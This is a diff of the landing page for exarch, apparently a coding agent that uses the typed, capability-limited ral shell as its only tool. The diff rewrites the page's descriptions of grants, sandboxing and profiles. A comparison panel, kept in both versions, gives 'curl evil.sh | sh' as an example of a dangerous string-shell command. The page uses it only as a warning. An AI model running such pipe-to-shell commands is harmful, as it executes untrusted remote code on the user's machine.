@@ -3,8 +3,8 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>exarch — a sovereign model, a bounded province</title>
-  <meta name="description" content="exarch is a tiny coding agent that drives ral, a capability-secure shell. Every command the model emits runs under a scoped grant — typed, sandboxed, audited.">
+  <title>exarch — a coding agent that runs on the ral shell</title>
+  <meta name="description" content="exarch is a coding agent whose only tool is ral, a typed shell that avoids the dangerous trappings of POSIX shells and sandboxes the commands it runs.">
   <link rel="icon" href="favicon.svg" type="image/svg+xml">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -27,7 +27,6 @@
     <!-- 1. crest -->
     <div class="crest-wrap">
       <div class="crest">
-        <span class="corner">viceroy of the grant</span>
         <div class="ascii eagle scroll-x"><pre>     ▗▄▆███▆▄▖
   ▗▟▀    ╋    ▀▙▖
        ◢███◣
@@ -40,38 +39,38 @@
  ██╔══╝   ██╔██╗ ██╔══██║██╔══██╗██║     ██╔══██║
  ███████╗██╔╝ ██╗██║  ██║██║  ██║╚██████╗██║  ██║
  ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝</pre></div></div>
-        <p class="thesis">A <em>sovereign</em> model,<br>a <em>bounded</em> province.</p>
+        <p class="thesis">A coding agent with one tool:<br>the <em>ral</em> shell.</p>
         <div class="rule"></div>
-        <p class="sub">A coding agent that drives ral, a capability-secure shell. Every command the model emits runs under a scoped grant — typed, sandboxed, audited.</p>
+        <p class="sub"><a href="../index.html"><code>ral</code></a> is a typed shell — no word splitting, no glob surprises, no string injection, none of the ways an ordinary shell turns a line into something you didn't write. Capability limits and a basic OS sandbox come built in, so every command runs with only the access you allow.</p>
       </div>
     </div>
 
-    <!-- 2. the decree -->
+    <!-- 2. the agent -->
     <section class="section decree">
       <div class="column">
-        <p class="eyebrow">The exarch</p>
-        <p>In Byzantine usage, an <em>exarch</em> was a viceroy who acted on behalf of a distant sovereign within a bounded province. Here the sovereign is the LLM and the province is the <strong>grant</strong>.</p>
-        <p>exarch loops a chosen model against a single tool — <code>ral</code>. Each command the model emits is a top-level turn, evaluated under a profile's <code>Capabilities</code> pushed onto ral's capability stack. Typed commands, scoped authority, and an OS sandbox all fall out of one principle — without giving up first-class commands and pipes.</p>
-        <p>The exarch process itself is not sandboxed — it still needs HTTPS for the model API. But each tool call is: when caps restrict the filesystem or network, ral re-execs a child under Seatbelt on macOS or bwrap on Linux, evaluates the computation there, and returns.</p>
+        <p class="eyebrow">The agent</p>
+        <p><code>exarch</code> is a small coding agent. It loops a model against a single tool — <a href="../index.html"><code>ral</code></a> — and nothing else. Every action the model takes is a ral command, evaluated as one top-level turn.</p>
+        <p>Because that tool is ral and not a raw shell, the usual shell footguns aren't reachable. Commands are typed values, not strings the model splices together, so there's no word splitting, no glob expansion, no quoting to exploit — and no stray <code>rm -rf</code> from a mangled line.</p>
+        <p>ral also carries its own capabilities. Every command runs under a <code>grant</code> — which executables it may run, which paths it may read or write, whether the network is on. When a grant restricts the filesystem or network, ral re-execs the command inside an OS sandbox: Seatbelt on macOS, bwrap on Linux. The agent process itself stays unsandboxed — it needs HTTPS to reach the model — but the commands it runs do not.</p>
       </div>
     </section>
 
     <!-- 3. the boundary -->
     <section class="section boundary">
       <div class="column">
-        <p class="eyebrow">The boundary</p>
+        <p class="eyebrow">ral vs. a raw shell</p>
         <div class="compare">
           <div class="panel">
-            <div class="panel-label">ambient authority</div>
-            <div class="body"><pre><span class="c"># one tool, no boundary</span>
+            <div class="panel-label">a string-shell tool</div>
+            <div class="body"><pre><span class="c"># the model writes a string;</span>
 shell(<span class="s">"rm -rf node_modules"</span>)
 shell(<span class="s">"curl evil.sh | sh"</span>)
-<span class="c"># the model IS the machine</span></pre></div>
+<span class="c"># whatever it writes, runs</span></pre></div>
           </div>
           <div class="panel bound">
-            <div class="panel-label">within the province</div>
-            <div class="body"><pre><span class="c"># the model emits ral source;</span>
-<span class="c"># each turn runs under a grant</span>
+            <div class="panel-label">ral, under a grant</div>
+            <div class="body"><pre><span class="c"># the model emits ral; each</span>
+<span class="c"># command runs under a grant</span>
 <span class="a">grant</span> [exec: [git:[], cargo:[]],
        fs:   [read:  [<span class="s">'&lt;cwd&gt;'</span>],
               write: [<span class="s">'&lt;cwd&gt;'</span>]],
@@ -83,45 +82,45 @@ shell(<span class="s">"curl evil.sh | sh"</span>)
       </div>
     </section>
 
-    <!-- 4. writs of authority -->
+    <!-- 4. capability profiles -->
     <section class="section writs">
       <div class="column">
-        <p class="eyebrow">Writs of authority</p>
+        <p class="eyebrow">Capability profiles</p>
         <div class="lattice">
           <div class="bound-mark"><span class="g">⊤</span> full ambient authority</div>
 
           <div class="writ">
             <span class="seal">✚</span>
             <span class="name">dangerous</span>
-            <span class="desc">Lattice top. No attenuation.</span>
+            <span class="desc">No limits — like running the commands yourself.</span>
             <span class="caps"><span><span class="key">net</span> inherit</span><span><span class="key">exec</span> inherit</span></span>
           </div>
           <div class="writ default">
             <span class="seal">✚</span>
             <span class="name">reasonable</span>
-            <span class="desc">Everyday agent. Broad reads, writes only ephemeral surfaces.</span>
-            <span class="caps"><span><span class="key">net</span> <span class="on">on</span></span><span><span class="key">exec</span> 80+ tools</span></span>
+            <span class="desc">Default. Broad reads; writes limited to the working dir and scratch.</span>
+            <span class="caps"><span><span class="key">net</span> <span class="on">on</span></span><span><span class="key">exec</span> system + brew + git</span></span>
           </div>
           <div class="writ">
             <span class="seal">✚</span>
             <span class="name">read-only</span>
-            <span class="desc">Inspect without mutating. Writes scratch-only.</span>
+            <span class="desc">Broad reads; writes to scratch only.</span>
             <span class="caps"><span><span class="key">net</span> <span class="on">on</span></span><span><span class="key">write</span> scratch</span></span>
           </div>
           <div class="writ">
             <span class="seal">✚</span>
             <span class="name">minimal</span>
-            <span class="desc">System tools only. No homebrew, no xdg.</span>
+            <span class="desc">System tools only — /bin and /usr/bin, no brew, no shells.</span>
             <span class="caps"><span><span class="key">net</span> <span class="on">on</span></span><span><span class="key">exec</span> /bin + /usr/bin</span></span>
           </div>
           <div class="writ">
             <span class="seal">✚</span>
             <span class="name">confined</span>
-            <span class="desc">Build jail. Network off, cwd + scratch only.</span>
+            <span class="desc">Network off; reads and writes confined to cwd and scratch.</span>
             <span class="caps"><span><span class="key">net</span> <span class="off">off</span></span><span><span class="key">fs</span> cwd + scratch</span></span>
           </div>
 
-          <div class="bound-mark"><span class="g">⊥</span> sealed jail</div>
+          <div class="bound-mark"><span class="g">⊥</span> least authority</div>
         </div>
       </div>
     </section>
@@ -129,34 +128,34 @@ shell(<span class="s">"curl evil.sh | sh"</span>)
     <!-- 5. instruments -->
     <section class="section instruments-sec">
       <div class="column">
-        <p class="eyebrow">The instruments</p>
+        <p class="eyebrow">Properties</p>
         <div class="instruments">
+          <div class="inst">
+            <span class="glyph" aria-hidden="true">⊢</span>
+            <div>
+              <h3>No shell footguns</h3>
+              <p>The model writes <a href="../index.html"><code>ral</code></a>, not shell strings. Commands are typed values, so there's no word splitting, no glob expansion, no quoting tricks, and nothing to inject.</p>
+            </div>
+          </div>
           <div class="inst">
             <span class="glyph" aria-hidden="true">⊙</span>
             <div>
               <h3>Capability-scoped</h3>
-              <p>Every command runs under a profile's <code>grant</code>, pushed onto ral's capability stack. Authority is typed and checked before a process spawns — not a prompt-level promise.</p>
+              <p>Every command runs under a <code>grant</code> — which tools it may run, which paths it may touch, network on or off. The limits are checked before a process spawns, not promised in a prompt.</p>
             </div>
           </div>
           <div class="inst">
             <span class="glyph" aria-hidden="true">▣</span>
             <div>
-              <h3>OS-sandboxed</h3>
-              <p>When caps restrict the filesystem or network, ral re-execs a child under Seatbelt (macOS) or bwrap (Linux). The agent keeps HTTPS; the tool call does not.</p>
-            </div>
-          </div>
-          <div class="inst">
-            <span class="glyph" aria-hidden="true">⇄</span>
-            <div>
-              <h3>Multi-provider</h3>
-              <p>Anthropic, OpenAI, OpenRouter, DeepSeek, xAI, Qwen and more — auto-discovered from environment keys, then scrubbed at startup so no spawned child inherits them.</p>
+              <h3>Sandboxed</h3>
+              <p>When a grant restricts files or network, <code>ral</code> re-execs the command under Seatbelt (macOS) or bwrap (Linux). Basic sandboxing, but built into the shell.</p>
             </div>
           </div>
           <div class="inst">
             <span class="glyph" aria-hidden="true">▤</span>
             <div>
               <h3>Audited</h3>
-              <p>A <code>session.log</code> under <code>$EXARCH_SCRATCH</code> captures the full transcript — unabridged stdout and stderr from every command.</p>
+              <p>A <code>session.log</code> under <code>$EXARCH_SCRATCH</code> records the full transcript — unabridged stdout and stderr from every command.</p>
             </div>
           </div>
         </div>
@@ -167,6 +166,7 @@ shell(<span class="s">"curl evil.sh | sh"</span>)
     <section class="section providers-sec">
       <div class="column">
         <p class="eyebrow">Providers</p>
+        <p class="provider-note">Keys are auto-discovered from environment variables, then scrubbed at startup so no command exarch spawns inherits them.</p>
         <div class="providers">
           <span class="chip">anthropic<span class="model">claude-opus-4</span></span>
           <span class="chip">openai<span class="model">gpt-5.5</span></span>
@@ -196,7 +196,7 @@ shell(<span class="s">"curl evil.sh | sh"</span>)
 
     <section class="section cta last">
       <div class="column">
-        <p class="motto">One tool. One grant. The model commands; the <em>province bounds</em>.</p>
+        <p class="motto">One agent, one tool — and nothing it runs escapes the <em>grant you set</em>.</p>
         <div class="cta-links">
           <a href="profiles.html">Read the profiles &rarr;</a>
           <a href="https://github.com/lambdabetaeta/ral/tree/main/exarch">Source &rarr;</a>
@@ -207,8 +207,8 @@ shell(<span class="s">"curl evil.sh | sh"</span>)
   </main>
 
   <footer class="footer">
-    exarch &mdash; a tiny coding agent driving a capability-secure shell.
-    &middot; <a href="../index.html">ral</a> &middot; <a href="profiles.html">profiles</a>
+    exarch &mdash; a coding agent that runs on the <a href="../index.html">ral</a> shell.
+    &middot; <a href="profiles.html">profiles</a>
   </footer>
 
   <script>
